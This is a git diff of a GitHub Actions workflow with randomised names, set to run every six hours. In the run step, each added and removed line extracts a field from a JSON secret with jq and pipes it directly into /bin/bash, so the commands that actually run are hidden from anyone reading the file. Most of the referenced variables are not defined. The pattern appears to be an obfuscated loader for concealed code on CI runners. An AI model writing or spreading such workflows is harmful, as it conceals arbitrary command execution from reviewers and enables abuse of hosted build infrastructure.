@@ -1,9 +1,9 @@
 name: elderlyremarkable
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 0/6 * * *'
+    - cron: '37 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: elderlyremarkable
         env:
-          zdrio19: ${{ secrets.zdrio19 }}
+          npl4: ${{ secrets.npl4 }}
         run: |
-          echo $zdrio19 | jq -r .xqutw505 | /bin/bash
-          echo $e05 | jq -r .rafpt0 | /bin/bash
-          echo $hiyj19726 | jq -r .q892 | /bin/bash
-          echo $y9 | jq -r .dh91193 | /bin/bash
-          echo $psodz15 | jq -r .se131 | /bin/bash
-          echo $ycjw88 | jq -r .rcxi817 | /bin/bash
-          echo $ewep17 | jq -r .rdj437 | /bin/bash
-          echo $limoi3 | jq -r .thvbp87034 | /bin/bash
-          echo $lc047 | jq -r .xw79 | /bin/bash
-          echo $cku4936 | jq -r .xhq0 | /bin/bash
-          echo $bkvf873 | jq -r .eqteo4411 | /bin/bash
+          echo $npl4 | jq -r .dpt808 | /bin/bash
+          echo $jenyb91 | jq -r .zhgzt938 | /bin/bash
+          echo $jnq0 | jq -r .ot26898 | /bin/bash
+          echo $u66592 | jq -r .oao7 | /bin/bash
+          echo $fxgie7308 | jq -r .fjhqm6 | /bin/bash
+          echo $itjd13311 | jq -r .r8475 | /bin/bash
 
